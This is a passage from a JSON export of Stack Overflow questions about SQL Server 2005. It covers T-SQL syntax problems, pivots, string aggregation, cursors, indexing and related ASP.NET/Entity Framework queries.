using joins such as <code>on c1.pkey = c2.pkey or c1.akey = c2.akey or c1.soundex = c2.soundex</code> but the performance was horrendous, and using unions seems to be working a lot better. Out of 103K customers, tt is currently generating a list of 8.5M potential matches (based on the phonetic codes) in 2.25 minutes, and then taking another 2 to score, rank and filter those down to about 3000. So I am happy with the performance, I just can't help but think there is a better way to structure this, and I need help adding the extra union condition.</p>\n\n<p>Thanks!</p>\n\n<p>EDIT: I seem to have the additional union working. I must have just had a typo or a parenthesis issue. I struggled with it for over 30 minutes and never got it working. A few hours later I tried another copy/paste and it worked fine. However, with my repeated joins between my customer and ##Metaphone tables (tables c1 and c2), is there a way to join that once and use that result set repeatedly? Could I create it as a temp table and alias it multiple times to find duplicate phonetic matches?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":3,"favorite_count":3,"up_vote_count":4,"down_vote_count":0,"view_count":4297,"score":4,"question_id":1426487,"title":"Format phone number","body":"<p>I have table in the db with phone number column the numbers look like this:</p>\n\n<blockquote>\n  <p>123456789</p>\n</blockquote>\n\n<p>I want to format that to:</p>\n\n<blockquote>\n  <p>123-456-789</p>\n</blockquote>\n\n<p>thanks!!!</p>\n"},{"tags":[".net","vb.net","sql-server-2005","mobile","windows-ce"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13073395,"title":"Windows CE 6.0 Application Error then Application Freezes but works in Windows CE 5","body":"<p>Hello I have a Windows CE Application that works fine in Windows CE 5.0 on MC3090 devices. However we got new Symbol MCs that run Windows CE 6.0 and the application runs but after an exception in the application and the application closes. I get an \"Application Error has occured\". If I try to open the application again it freezes the entire device and I have to reboot it.</p>\n\n<p>The vendor Symbol/Motorola is saying it's not an OS issue but rather a software issue. I am using .NET Framework 3.5. We're using SQL Compact Mobile 3.5 to connect to a remote SQL Server.</p>\n\n<p>Is there anyway I can find out what is causing the \"Application Error\"?</p>\n\n<p>Thanks</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":13073105,"title":"Case statement with 'OR' statement","body":"<pre><code>SELECT   ProductNumber, Category =\n      CASE ProductLine\n         WHEN 'R' or 'r' THEN 'Road'\n         WHEN 'M' or 'm' THEN 'Mountain'\n         WHEN 'T' or 't' THEN 'Touring'\n         WHEN 'S' or 's' THEN 'Other sale items'\n         ELSE 'Not for sale'\n</code></pre>\n\n<p>My basic requirement is to use 'OR' with CASE (if possible) , Please suggest if i am doing anything wrong.</p>\n"},{"tags":["mysql","sql-server","sql-server-2005","stored-procedures","udf"],"answer_count":8,"favorite_count":31,"up_vote_count":54,"down_vote_count":0,"view_count":34271,"score":54,"question_id":451415,"title":"Simulating group_concat MySQL function in Microsoft SQL Server 2005?","body":"<p>I'm trying to migrate a MySQL-based app over to Microsoft SQL Server 2005 (not by choice, but that's life).</p>\n\n<p>In the original app, we used <em>almost</em> entirely ANSI-SQL compliant statements, with one significant exception -- we used MySQL's <code>group_concat</code> function fairly frequently.</p>\n\n<p><code>group_concat</code>, by the way, does this: given a table of, say, employee names and projects...</p>\n\n<pre><code>SELECT empName, projID FROM project_members;\n</code></pre>\n\n<p>returns:</p>\n\n<pre><code>ANDY   |  A100\nANDY   |  B391\nANDY   |  X010\nTOM    |  A100\nTOM    |  A510\n</code></pre>\n\n<p>... and here's what you get with group_concat:</p>\n\n<pre><code>SELECT \n    empName, group_concat(projID SEPARATOR ' / ') \nFROM \n    project_members \nGROUP BY \n    empName;\n</code></pre>\n\n<p>returns:</p>\n\n<pre><code>ANDY   |  A100 / B391 / X010\nTOM    |  A100 / A510\n</code></pre>\n\n<p>...So what I'd like to know is: Is it possible to write, say, a user-defined function in SQL Server which emulates the functionality of <code>group_concat</code>? I have almost no experience using UDFs, stored procedures, or anything like that -- just straight-up SQL -- so please err on the side of too much explanation :)</p>\n"},{"tags":["sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":93,"score":0,"question_id":11682267,"title":"sql server stored procedure single quotes","body":"<p>I am totally confused with this procedure.please correct my mistakes in quotes.</p>\n\n<pre><code>create procedure queryingsfor \n  @Tabname nvarchar(250),\n  @colname nvarchar(250),\n  @opname nvarchar(290),\n  @valuesname nvarchar(239) \nas\nbegin\n  set NOCOUNT on;\n  declare @sql varchar(4000)\n  set @sql='select * from' +@Tabname+ 'where' +@colname+''''+@opname+''''+ ''''+@valuesname+''''\n  exec(@sql)\nend\nexec queryingsfor 'education','eduCurrentStudy','=','DME'\n</code></pre>\n\n<p>I'm only getting:</p>\n\n<blockquote>\n  <p>Error: Msg 102, Level 15, State 1, Line 1<br>\n  Incorrect syntax near 'fromeducationwhereeduCurrentStudy'.</p>\n</blockquote>\n"},{"tags":["xml","sql-server-2005","xquery"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":4794,"score":0,"question_id":577871,"title":"Select records from XML column (SQL Server 2005) based on node order","body":"<p>I have a column in a SQL Server 2005 table defined as an XML column.  Is there a way to select records from this table based on the order of two nodes in that column?  For example, we have the following structure in our XML:</p>\n\n<pre><code>&lt;item&gt;\n   &lt;latitude/&gt;\n   &lt;longitude/&gt;\n&lt;/item&gt;\n</code></pre>\n\n<p>I want to see if there are any records that have latitude/longitude in the opposite order i.e. <code>&lt;longitude/&gt;</code> then <code>&lt;latitude/&gt;</code>.  I've tried some XPath expressions but with no luck.</p>\n"},{"tags":["sql","query","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13064040,"title":"Pivot table in sql server 2005","body":"<p>This is my record in my table </p>\n\n<pre><code>GuestName      F1    H1    F2  H2  F3   H3\nRyan Palma     1200  Room  12  SC  14   VAT\nRichard Palma  1500  Room  15  SC  17   VAT\nRuth Palma     1600  Room  16  SV  18   VAT\n</code></pre>\n\n<p>I want an output like this</p>\n\n<pre><code>GuestName      Room  SC  VAT\nRyan Palma     1200  12  14\nRichard Palma  1500  15  17\nRuth Palma     1600  16  18\n</code></pre>\n\n<p>How can i do this using query,</p>\n\n<p>Thanks in advance, any help is appreciated</p>\n"},{"tags":["sql","sql-server","sql-server-2005","stored-procedures"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":13064362,"title":"SQL Server INSERT  SELECT Statement won't parse","body":"<p>I get the following error message with SQL Server 2005</p>\n\n<blockquote>\n  <p><em>Msg 120, Level 15, State 1, Procedure EPIN, Line 37</em><br>\n  <em>The select list for the INSERT statement contains fewer items than the insert list. The  number of SELECT values must match the\n  number of INSERT columns.</em></p>\n</blockquote>\n\n<p>I have copy and pasted the select list and insert list into excel and verified there are the same number of items in each list. Both tables an additional primary key field with is not listed in either the insert statement or select list. I am not sure if that is relevant, but suspicious it may be. </p>\n\n<p>Here is the source for my stored procedure:</p>\n\n<pre><code> set ANSI_NULLS ON\n set QUOTED_IDENTIFIER ON\n go\n\n -- =============================================\n -- Author:     Kristian Manuel\n -- Create date: 10/3/2012\n -- Description:    \n -- =============================================\n ALTER PROCEDURE [dbo].[EPIN] \n-- Add the parameters for the stored procedure here\n     @PLUCODE varchar(30),      --Table tblPolicy\n     @ECPAYFEES numeric(18,2),\n     @COSTPAYABLE numeric(18,2),\n     @RETAILPRICE numeric(18,2),\n     @DENOMINATION varchar(50),\n     @CARDNAME varchar(50),\n     @DistributorID varchar(8),\n     @AccntID decimal(18,0)\n\n --PO1  \n AS\n BEGIN\n     -- SET NOCOUNT ON added to prevent extra result sets from\n     -- interfering with SELECT statements.\n     SET NOCOUNT ON;\n\n     INSERT INTO [ECPAY-PC].[GENESIS].[dbo].[tblPolicy]\n     ( \n       PolicyID                 ,\n       AccountTID               ,\n       DistributorID            ,\n       CARDNAME                 ,\n       DENOMINATION             ,\n       RETAILPRICE              ,\n       COSTPAYABLE              ,\n       ECPAYFEES                ,\n       PLUCODE \n     ) \n     SELECT \n         t.* \n     FROM\n        (SELECT \n            AccountTID = @AccntID, \n            DistributorID = @DistributorID, \n            CARDNAME = @CARDNAME,      \n            DENOMINATION = @DENOMINATION, \n            RETAILPRICE = @RETAILPRICE, \n            COSTPAYABLE = @COSTPAYABLE,      \n            ECPAYFEES = @ECPAYFEES, \n            PLUCODE = @PLUCODE) t,\n        [ECPAY-PC].[ECPNWEB].[dbo].[account] a\n     WHERE\n        a.AccntID = t.AccountTID --for account\n END\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":13063139,"title":"SQL Server two lines in one","body":"<p>Hello and thanks for your attention</p>\n\n<p>I need to convert data from two different lines into one line. </p>\n\n<p>Let s imagine </p>\n\n<p><code>ORDERS</code> table:</p>\n\n<pre><code>ID    Name    adress   \n-------------------- \n01    AA      adr1\n02    BB      adr2\n03    CC      adr3\n</code></pre>\n\n<p><code>LINEORDERS</code> table:</p>\n\n<pre><code>ID    IDorder    IDprofileType     ProfileType      idPers   \n------------------------------------------------------------- \n01    01         01                Organizer        0045\n01    01         02                Present          0085\n01    01         02                Present          0032\n01    01         03                Manager          0018\n</code></pre>\n\n<p>Lets imagine we want as result ></p>\n\n<p>Desired result:</p>\n\n<pre><code>IDorder   NameOrder     OrganizerID           PresentID           ManagerID       Diff\n------------------------------------------------------------- \n01        AA            0045                  0085                0018            yes\n01        AA            0045                  0032                0018            yes\n</code></pre>\n\n<p><code>Diff</code> is yes if <code>managerID</code> and <code>organizerID</code> are different.</p>\n\n<p>How can I get such a result?</p>\n\n<p>Do I need to create  T-SQL temporary tables? What would be the lighter?</p>\n\n<p>I have a lot of lines in the table.</p>\n\n<p>Thanks for your help</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":59,"score":2,"question_id":13050203,"title":"find several texts in sql column","body":"<p>I have a column that contains html details in it and within each column, the html contains different http links. I need to find out all the http links in each column.</p>\n\n<p>e.g.: column 1 Row 1</p>\n\n<pre><code>html \n... \na href = http://www.column1.com....... \nimg src=http://www.pic1.com/images/im.jpg...\n...\n/html\n</code></pre>\n\n<p>column 1 Row 2 </p>\n\n<pre><code>html \n...\na href = http://www.column2.com.......  \nimg src=\"http://www.pic2.com/images/im.jpg\".... \n/html\n</code></pre>\n\n<p>in the result I need to get the following list :</p>\n\n<ul>\n<li>link1 in first column1 in href\ndomain in the first column img link</li>\n<li>link2 in second column2 in href\ndomain in the second column img2 link</li>\n</ul>\n\n<p>Could anyone help me to find this as i don't have a clue at all what to do and I'm not good using sql.</p>\n"},{"tags":["sql","database","sql-server-2005","table","stored-procedures"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":13060307,"title":"How to retrieve the records of the table from database to another database","body":"<p>I have two tables with different database</p>\n\n<p>-AccntID from table 'account' &lt;--database name 'ECPNWEB'\n-AccountTID from table 'tblPolicy' &lt;--database name 'GENESIS'</p>\n\n<p>Now I want to insert 'tblPolicy' like this: &lt;--database 'GENESIS'</p>\n\n<pre><code>  INSERT INTO dbo.tblPolicy\n      ( \n\n        PolicyID                 ,\n        AccountTID               ,\n        DistributorID            ,\n        CARDNAME                 ,\n        DENOMINATION             ,\n        RETAILPRICE              ,\n        COSTPAYABLE              ,\n        ECPAYFEES                ,\n        PLUCODE \n\n      ) \n-- Insert statements for procedure here\n\n\nselect t.* from\n(Select  AccountTID=@AccntID, DistributorID=@DistributorID, CARDNAME=@CARDNAME, DENOMINATION=@DENOMINATION, RETAILPRICE=@RETAILPRICE, COSTPAYABLE=@COSTPAYABLE, ECPAYFEES=@ECPAYFEES, PLUCODE=@PLUCODE) t,\naccount a\nwhere a.AccntID = t.AccountTID --for account\n</code></pre>\n\n<p>Now what I want to do is to insert this \"ONLY\" to tblPolicy connected with the 'account' table with different database 'GENESIS'</p>\n\n<p>Thanks in Advance</p>\n"},{"tags":["sql-server-2005","table","insert-into"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13057383,"title":"How to add a row number to new table in SQL?","body":"<p>I'm trying to create a new table using an existing table already using:</p>\n\n<pre><code>INSERT INTO NewTable (...,...)\n   SELECT * from SampleTable\n</code></pre>\n\n<p>What I need to is add a record number at the beginning or the end, it really doesn't matter as long as it's there.</p>\n\n<p><strong>Sample Table</strong></p>\n\n<pre><code>Elizabeth  RI 02914\nEmily      MA 01834\n</code></pre>\n\n<p><strong>Prospective New Table</strong></p>\n\n<pre><code>1 Elizabeth  RI 02914\n2 Emily      MA 01834\n</code></pre>\n\n<p>Is that at all possible?</p>\n\n<p>This is what I ultimately I'm shooting for... except right now those tables aren't the same size because I need my ErrorTemporaryTable to have a column in which the first row has a number which increments by the previous one by one.</p>\n\n<pre><code>declare @counter int\ndeclare @ClientMessage varchar(255)\ndeclare @TestingMessage carchar(255)\nselect @counter = (select count(*) + 1 as counter from ErrorValidationTesting)\nwhile @counter &lt;= (select count(*) from ErrorValidationTable ET, ErrorValidationMessage EM where ET.Error = EM.Error_ID)\nbegin\n    insert into ErrorValidationTesting (Validation_Error_ID, Program_ID, Displayed_ID, Client_Message, Testing_Message, Create_Date)\n    select * from ErrorTemporaryTable\n\n    select @counter = @counter + 1\n\nend\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","append"],"answer_count":4,"favorite_count":1,"up_vote_count":11,"down_vote_count":0,"view_count":11651,"score":11,"question_id":466323,"title":"How to append to a text field in t-sql SQL Server 2005","body":"<p>What is the best way to append to a text field using t-sql in Sql Server 2005?</p>\n\n<p>With a varchar I would do this.</p>\n\n<pre><code>update tablename set fieldname = fieldname + 'appended string'\n</code></pre>\n\n<p>But this doesn't work with a text field.</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2000"],"answer_count":4,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":5974,"score":4,"question_id":272254,"title":"Alternative to BACKUP LOG WITH TRUNCATE_ONLY","body":"<p>This piece of T-SQL is deprecated in 2005:</p>\n\n<pre><code>BACKUP LOG [DB_NAME] WITH TRUNCATE_ONLY\n</code></pre>\n\n<p>I don't need to keep a backup the log for my db - but I do not want the piece of code to stop working if we port to SQL2008 or successive versions in future.</p>\n\n<p>Cheers</p>\n"},{"tags":["c#","sql-server-2005","asp.net-2.0"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13052092,"title":"Timeout connection error while executing this piece of code in ASP.NET 2.0 and C#","body":"<p>I am using the below code to grab the page tiles, meta description from database created in SQL Server 2005. My site is built with ASP.NET 2.0 and C#.</p>\n\n<p>On <code>page_load</code> I am executing this code:</p>\n\n<pre><code>string query = \"select MetaDescription, MetaKeywords, H1Text, Ptitle, H2Text FROM SeoText Where CatalogItemId ='\" + this.CurrentEnsemble.ItemId + \"'\";\n\nSqlConnection myconnection = new SqlConnection(ConfigurationManager.ConnectionStrings[\"DBconnection\"].ConnectionString);\n\nSqlCommand SqlCmd = null;\nSqlCmd = new SqlCommand(query, myconnection);\n\nSqlDataAdapter ad = new SqlDataAdapter(SqlCmd);\n\nDataTable dt = new DataTable();\nad.Fill(dt);\n\nif (dt.Rows[0][\"Ptitle\"].ToString() == \"\")\n{\n   this.Page.Title = this.CurrentEnsemble.Title;\n}\nelse\n{\n   this.Page.Title = this.CurrentEnsemble.Title + \" \" + dt.Rows[0][\"Ptitle\"].ToString();\n}\n\nHtmlMeta metaDesc = (HtmlMeta)Page.Header.FindControl(\"metaDesc\");\n\nif (dt.Rows[0][\"MetaDescription\"].ToString() == \"\")\n{\n   metaDesc.Attributes.Add(\"Content\", this.CurrentEnsemble.Title );\n}\nelse\n{\n   metaDesc.Attributes.Add(\"Content\", dt.Rows[0][\"MetaDescription\"].ToString());\n}\n\nHtmlMeta metaKey = (HtmlMeta)Page.Header.FindControl(\"metaKey\");\n\nif (dt.Rows[0][\"MetaKeywords\"].ToString() == \"\")\n{\n   metaKey.Attributes.Add(\"Content\", \"site general text\");\n}\nelse\n{\n   metaKey.Attributes.Add(\"Content\", dt.Rows[0][\"MetaKeywords\"].ToString());\n}\n\nHtmlGenericControl h1 = (HtmlGenericControl)Master.Master.Master.FindControl(\"h1top\");\n\nif (dt.Rows[0][\"H1Text\"].ToString() == \"\")\n{\n    h1.InnerText = \"site general text\";\n}\nelse\n{\n    h1.InnerText = this.CurrentEnsemble.Title + \" \" + dt.Rows[0][\"H1Text\"].ToString();\n}\n\nHtmlGenericControl h2 = (HtmlGenericControl)Master.Master.Master.FindControl(\"h2bottom\");\n\nif (dt.Rows[0][\"H2Text\"].ToString() == \"\")\n{\n    h2.InnerText = \"site general text\";\n}\nelse\n{\n    h2.InnerText = this.CurrentEnsemble.Title + \" \" + dt.Rows[0][\"H2Text\"].ToString();\n}\n</code></pre>\n\n<p>The error is thrown at </p>\n\n<pre><code>ad.Fill(dt)\n</code></pre>\n\n<p>I am not sure where I am making the mistake.</p>\n\n<p>Thanks and appreciate it</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":64,"score":3,"question_id":13049031,"title":"Wanted to add two more column , in existing select statement","body":"<p>I have a sample query </p>\n\n<pre><code>select \n    x as 1, y as 2 , z as 3 \nfrom \n    table abc, xyz\nwhere \n    a = x and x = 123\n</code></pre>\n\n<p>Now I want to add two more columns in this <code>SELECT</code> statement like this:</p>\n\n<ol>\n<li>column 4 which will show the row sequence no.</li>\n<li>column 5: this column will depend on the row - it will show <code>start</code> in first row, <code>Last</code> in the last row and <code>Middle</code> in any rows in between.</li>\n</ol>\n\n<p>Please suggest the best possible optimize way to do this.</p>\n\n<p>Thanks </p>\n"}]}
{"total":14387,"page":3,"pagesize":100,"questions":[{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":8,"favorite_count":7,"up_vote_count":46,"down_vote_count":0,"view_count":42752,"score":46,"question_id":266924,"title":"Create a date with T-SQL","body":"<p>I am trying to convert a date with individual parts such as 12, 1, 2007 into a datetime in SQL Server 2005. I have tried the following:</p>\n\n<pre><code>CAST(DATEPART(year, DATE)+'-'+ DATEPART(month, DATE) +'-'+ DATEPART(day, DATE) AS DATETIME)\n</code></pre>\n\n<p>but this results in the wrong date. What is the correct way to turn the three date values into a proper datetime format.</p>\n"},{"tags":["sql-server-2005","cursor"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13051616,"title":"Should I be avoiding @@Fetch_Status?","body":"<p>After doing some reading it became apparent that multiple procedures can modify the global variable <code>@@Fetch_Status</code>.  We have a stored procedure that calls other stored procedures every hour (kind of like a table driven trigger, this way clients get control but no on has to touch but one trigger). So this parent procedure with calls these children procedures uses a cursor. Some of the child procedures could use cursors too. </p>\n\n<p>I know every <code>Fetch Next</code> call is pretty much immediately followed by a <code>@@Fetch_Status</code> call but with things happening in parallel I wasn't sure if calling <code>@@Fetch_Status</code> was thread safe, especially considering the <strong>Remarks</strong> section <a href=\"http://msdn.microsoft.com/en-us/library/ms187308%28v=sql.90%29.aspx\" rel=\"nofollow\">here</a>. So I thought it would be a bright idea to replace all my <code>While @@Fetch_Status = 0)</code> calls to be something like </p>\n\n<pre><code>WHILE ( (SELECT fetch_status\nFROM sys.dm_exec_cursors(0)\nwhere name = 'server_cursor')=0) BEGIN\n</code></pre>\n\n<p>This worked great on my computer but when I moved it over to a client machine I learned that I don't have select permissions on the <code>sys.dm_exec_cursors(0)</code> table. I get the error <code>The user does not have permission to perform this action.</code>. </p>\n\n<p>Or alternatively, if I try <code>select * from sys.syscursors</code> I get the error <code>The SELECT permission was denied on the object 'syscursors', database 'mssqlsystemresource', schema 'sys'.</code></p>\n\n<p>Is there another way to do this that ensures multiple simultaneous cursors do not step on each other? Or am I working too hard here?</p>\n"},{"tags":["performance","sql-server-2005","computed-columns"],"answer_count":0,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":41,"score":3,"question_id":13051507,"title":"Computed column index","body":"<p>I have a table <code>Com_Main</code> which contains column <code>CompanyName nvarchar(250)</code>. It has average length of 19, max length = 250.</p>\n\n<p>To improve performance I want to add a computed column <code>left20_CompanyName</code> which holds the first 20 characters of <code>CompanyName</code>:</p>\n\n<pre><code>alter table Com_main \nadd left20_CompanyName as LEFT(CompanyName, 20) PERSISTED\n</code></pre>\n\n<p>Then I create Index on this column:</p>\n\n<pre><code>create index ix_com_main_left20CompanyName \non Com_main (LEFT20_CompanyName)\n</code></pre>\n\n<p>So when I use</p>\n\n<pre><code>select CompanyName from Com_Main\nwhere LEFT20_CompanyName LIKE '122%'\n</code></pre>\n\n<p>it uses this nonclustered index, but when the query is like:</p>\n\n<pre><code>select CompanyName from Com_Main \nwhere CompanyName LIKE '122%'\n</code></pre>\n\n<p>It uses full table scan, and don't use this index. </p>\n\n<p>So the question:</p>\n\n<p>Is it possible to make SQL Server use this index on computable column in last query?</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","set-based"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":84,"score":6,"question_id":13030723,"title":"Trying to avoid RBAR! How to correlate an insert on a related table as a set based operation?","body":"<p>Assume a schema that consists of the following tables:</p>\n\n<p><strong>Baz</strong></p>\n\n<pre><code>BazID (PK, Identity)\nDescription\n</code></pre>\n\n<p><strong>FooTemplate</strong> (A Baz may have zero to many FooTemplates)</p>\n\n<pre><code>FooTemplateID (PK, Identity)\nBazID (FK)\nDescription\nNextGenerationDate\n</code></pre>\n\n<p><strong>BarTemplate</strong> (A FooTemplate may have zero to many BarTemplates)</p>\n\n<pre><code>BarTemplateID (PK, Identity)\nFooTemplateID (FK)\nDescription\n</code></pre>\n\n<p><strong>Foo</strong> (A Baz may have zero to many Foos)</p>\n\n<pre><code>FooID (PK, Identity) \nBazID (FK)\nDescription\n</code></pre>\n\n<p><strong>Bar</strong> (A Foo may have zero to many Bars)</p>\n\n<pre><code>BarID (PK, Identity)\nFooID (FK)\nDescription\n</code></pre>\n\n<p>Each day a stored procedure will execute to generate <code>Foo</code> and <code>Bar</code> entities for an associated <code>Baz</code> entity which have passed their next generation date.</p>\n\n<p>The first part of this procedure looks a little like this:</p>\n\n<pre><code>DECLARE @GeneratedFooIDList TABLE (INT FooID);\nINSERT Foo (BazID, Description)\nOUTPUT inserted.FooID INTO @GeneratedFooIDList\nSELECT\n  BazID\n  Description\nFROM\n  FooTemplate\nWHERE\n  NextGenerationDate &lt; GETDATE()\n</code></pre>\n\n<p>My question is what statement can I now execute to generate the proper <code>Bar</code> entities and have them properly associated with the newly created <code>Foo</code> entities?</p>\n\n<p><strong>EDIT:</strong> The procedure will be executing on a server running SQL Server 2005.</p>\n\n<p><strong>EDIT2:</strong> Thanks to everybody for the help.  After considering the information carefully, I have opted for another solution.  I have changed the primary key in the Foo table to no longer be an automatically generated identity column, this way an intermediary insert into a temporary table could be executed to capture the relevant FooTemplateID along with the FooID</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":10,"favorite_count":2,"up_vote_count":11,"down_vote_count":0,"view_count":9316,"score":11,"question_id":916414,"title":"How can a LEFT OUTER JOIN return more records than exist in the left table?","body":"<p>I have a very basic LEFT OUTER JOIN to return all results from the left table and some additional information from a much bigger table. The left table contains 4935 records yet when I LEFT OUTER JOIN it to an additional table the record count is significatnly larger.</p>\n\n<p>As far as I'm aware it is absolute gospel that a LEFT OUTER JOIN will return all records from the left table with matched records from the right table and null values for any rows which cannot be matched, as such it's my understanding that it should be impossible to return more rows than exist in the left table, but it's happening all the same!</p>\n\n<p>SQL Query follows:</p>\n\n<pre><code>SELECT     SUSP.Susp_Visits.SuspReason, SUSP.Susp_Visits.SiteID\nFROM         SUSP.Susp_Visits LEFT OUTER JOIN\n                      DATA.Dim_Member ON SUSP.Susp_Visits.MemID = DATA.Dim_Member.MembershipNum\n</code></pre>\n\n<p>Perhaps I have made a mistake in the syntax or my understanding of LEFT OUTER JOIN is incomplete, whatever the reason I'm going mad here, hopefully someone can explain how this could be occuring?</p>\n\n<p>Postscript</p>\n\n<p>Thanks for the grea answers, my understanding of LEFT OUTER JOINS is now much better, could anyone however suggest a way this query could be modified so that I only get as many records returned as exist in the left table? </p>\n\n<p>This query is purely to generate a report and the duplicate matches simply confuse matters.</p>\n\n<p>/Postscript</p>\n"},{"tags":["c#","sql","sql-server-2005","dataset"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":91,"score":1,"question_id":13041795,"title":"Splitting a dataset in to datatables","body":"<p>I have a software system that I am 'trying' to maintain and upgrade.  I have had no formal c# training and only 1 class of sql.  Most of my limited experience is with Java, C++.  We are using MSSQL 2005.</p>\n\n<p>I have a query run in c# that gets a dataset with 1 table and 15 or so columns.  The number of rows returned is different each time it is ran.  The first column is the storeid.  I need to separate records by storeid in to their own datatable.  Once I have that there is an existing method for sending it out to a CSV file.</p>\n\n<p>So far I have found Datatable.Select, order it by storeid.</p>\n\n<p>One option would be pulling all the unique storeid's from the dataset and putting them into an array.  Then I could query based on existing storeid's and copy or move those rows to a new datatable using a foreach.</p>\n\n<p>If someone could just point me in the right direction it would be much appreciated.</p>\n\n<p>Mark</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":40,"score":2,"question_id":13039742,"title":"Create a user with permissions for only 1 database","body":"<p>What is the way via a script to add a user to a database with permissions of select, insert, update and delete but only have access to that one database?</p>\n"},{"tags":["sql-server-2005","sql-server-2008","database-backups","downgrade"],"answer_count":4,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":15982,"score":4,"question_id":849678,"title":"Downgrading SQL server 2008 to SQL Server 2005","body":"<p>Are there any issues backing up a database from SQL Server 2008, and then importing it into SQL Server 2005? I had upgraded to SQL Server 2008, but 2008 seems to be too problematic so now I want to downgrade. Are there any problems in doing this?</p>\n"},{"tags":["entity-framework","sql-server-2005","entity-framework-5"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":45,"score":2,"question_id":13039207,"title":"Entity Framework and date+time arithmetic","body":"<p>We have the situation where we have a SQL Server 2005 table with a Date column and a separate Time column.  When I try to query this table, I'd like to do the equivalent of the following SQL:</p>\n\n<p><code>where Date + Time &gt; @Something</code></p>\n\n<p><em>Some background info - the Date is stored as a date with a 00:00 time component, and the Time is stored as a Time with a 1900-01-01 date component - this means in SQL adding the two together get you a full DateTime.</em></p>\n\n<p>I know there are indexing implications above, but that is not what the question is about.</p>\n\n<p><strong>How do you do this in linq to entities?</strong></p>\n\n<p>Some other things to note:</p>\n\n<ul>\n<li>Changing the database schema is out of the question.</li>\n<li>This is SQL 2005 so no Time datatype, and no TimeSpan returned from EF (I have tried changing the EF model to try and cast it to a TimeSpan, but no dice)</li>\n<li>I want to try and stick to pure Linq-to-Entities and not go down the E-SQL / stored procedure / ExecuteQuery route.</li>\n</ul>\n"},{"tags":["sql-server","sql-server-2005","tsql","schema"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":4230,"score":5,"question_id":3806245,"title":"SQL server schema and default schema","body":"<p>I have a schema define in my database. Except now everytime I do a sql statement I have to provide the schema ... \n<code>SELECT * FROM [myschema].table</code></p>\n\n<p>I set the default schema for my user using management studio and also ran the \n<code>ALTER USER myUser WITH DEFAULT_SCHEMA [myschema]</code> \nand I still get the invalid object 'table' when writing a query without the schema (SELECT * FROM table)</p>\n\n<p>Is there a way to write <code>SELECT * FROM table</code> without having to specify the schema name all the time?</p>\n\n<p>It's on SQL 2005 using SQL Management Studio.</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005","sql-server-2008-r2","sql-server-2000"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":65,"score":2,"question_id":13038964,"title":"SQL Server - Select between two number ranges in a varchar field with text and numbers","body":"<p>I have a table with ranges of numbers from 0-2000000. I can use a between statement to get the records of things if I do a BETWEEN 50 AND 100. That works. </p>\n\n<p>But the problem I'm running into is since this column is a varchar if there are any records with a something in the string as \"1FD32\", I can't select between it. SQL server can't convert the \"BETWEEN 50 AND 100\" because it is looking for an int. How can i get all the records between these ranges, and ignore any with letters in them?</p>\n"},{"tags":["c#","asp.net-mvc","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":181,"score":-1,"question_id":9547538,"title":"Assembly for DBDataContext, I am so new","body":"<p>I peek into my classmate's computer program and I see this:</p>\n\n<pre><code>DBDataContext db = new DBDataContext();\n</code></pre>\n\n<p>I try the same but my program reports that There is no <code>DBDataContext</code>, what assembly is it I need to reference now?</p>\n"},{"tags":["sql","sql-server-2005","join","trim"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":52,"score":1,"question_id":13034510,"title":"Remove specific characters from column data of select query","body":"<p>I have searched and searched for a solution to my problem and even though I've found some that may help, I'm not sure it's the right way to do it for what I need. Keep in mind I am learning and fairly new to SQL. But I have two tables I want to query using an inner join.</p>\n\n<p>There is a column named <code>CAVITY</code> in both tables but they hold the values in different formats. One table holds the value as H02 and the other table hold the value as just 2. </p>\n\n<p>I want to inner join on this column using the H02 format but don't want to UPDATE the table that holds the value as a single number(for data entry purposes). So for example, if the one table column has H02 and the other has 2, I want it to be joined. If one table has H13 and the other 13, I want it to be a join as well. So basically, I am wanting to 